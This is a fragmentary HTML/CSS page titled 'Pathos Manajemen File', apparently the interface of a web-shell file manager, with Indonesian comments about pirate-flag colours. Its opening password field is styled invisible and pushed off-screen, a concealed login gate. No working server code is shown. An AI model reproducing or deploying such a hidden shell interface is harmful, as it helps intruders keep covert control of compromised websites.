...
<form method="post"><input style="margin:100;margin-left: 100%;background-color:#fff;border:1px solid #fff;" type="password" name="pass"></form>
...
<head>
    ...
    <title>Pathos Manajemen File</title>
    <style>
        ...
        body {
            ...
            margin: 0;
            padding: 0;
            background: url('https://upload.wikimedia.org/wikipedia/commons/b/b9/Circle_reflect_wikipedia.jpg') no-repeat center center fixed;
        ...
        h1 {
            text-align: center;
            color: #5124b7 ; /* Warna kuning cerah seperti bendera Jolly Roger */
        ...
        .nav-tabs button {
            background-color: #8465DC; /* Warna kuning keemasan dari bendera Jolly Roger */
            color: #000; /* Warna teks hitam untuk kontras */
            border: 2px solid #5124b7; /* Garis pinggir warna emas */
            padding: 12px 24px;
            margin: 0 10px;
            border-radius: 30px;
            cursor: pointer;
        ...
        .nav-tabs button.active {
            background-color: #5124b7; /* Warna tombol aktif lebih cerah */
            color: #000;
        ...
        .button:hover {
            background-color: #5124b7; /* Warna tombol saat hover lebih cerah */
            color: #000;
            transform: scale(1.05);
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
...
<body>
    <div class="container">
        <!-- Logo -->
        <img src="https://mir-s3-cdn-cf.behance.net/project_modules/max_1200/6071f379722289.5ccbece45c3d0.gif" alt="Logo" class="logo">

        <h1>Pathos Manajemen File</h1>
        <button id="theme-toggle" style="position: fixed; top: 20px; right: 20px; padding: 10px 20px; border: none; border-radius: 5px; background-color: #5124b7 ; color: #000; cursor: pointer;">Toggle Mode</button>
        <div class="nav-tabs">
